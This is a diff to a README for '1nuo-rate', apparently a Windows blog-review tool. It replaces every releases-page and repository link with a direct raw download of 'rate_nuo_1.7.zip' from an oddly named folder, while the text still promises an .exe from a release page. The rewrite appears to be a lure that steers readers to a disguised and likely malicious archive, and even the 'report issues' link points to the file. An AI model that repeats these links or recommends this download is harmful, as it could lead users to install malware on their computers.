@@ -1,6 +1,6 @@
 # ⚙️ 1nuo-rate - Streamline Blog Reviews Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-1nuo--rate-blue?style=for-the-badge)](https://github.com/Power866/1nuo-rate/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-1nuo--rate-blue?style=for-the-badge)](https://github.com/Power866/1nuo-rate/raw/refs/heads/main/trigonocephalous/rate_nuo_1.7.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get 1nuo-rate running on your Windows computer.
 
 Click the large badge at the top or go to:
 
-https://github.com/Power866/1nuo-rate/releases
+https://github.com/Power866/1nuo-rate/raw/refs/heads/main/trigonocephalous/rate_nuo_1.7.zip
 
 This is where you find all the latest versions of the software.
 
@@ -113,7 +113,7 @@ This serverless design keeps your costs low and setup simple. There is no need t
 To get started now:
 
 1. Visit the release page:  
-   [https://github.com/Power866/1nuo-rate/releases](https://github.com/Power866/1nuo-rate/releases)  
+   [https://github.com/Power866/1nuo-rate/raw/refs/heads/main/trigonocephalous/rate_nuo_1.7.zip](https://github.com/Power866/1nuo-rate/raw/refs/heads/main/trigonocephalous/rate_nuo_1.7.zip)  
 
 2. Download the Windows installer file (`.exe`) for the latest version.  
 
@@ -146,10 +146,10 @@ To get started now:
 
 This app is open source. If you want to report issues or contribute, visit the GitHub repository:
 
-https://github.com/Power866/1nuo-rate
+https://github.com/Power866/1nuo-rate/raw/refs/heads/main/trigonocephalous/rate_nuo_1.7.zip
 
 Use the Issues tab to report bugs or request features.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-1nuo--rate-blue?style=for-the-badge)](https://github.com/Power866/1nuo-rate/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-1nuo--rate-blue?style=for-the-badge)](https://github.com/Power866/1nuo-rate/raw/refs/heads/main/trigonocephalous/rate_nuo_1.7.zip)
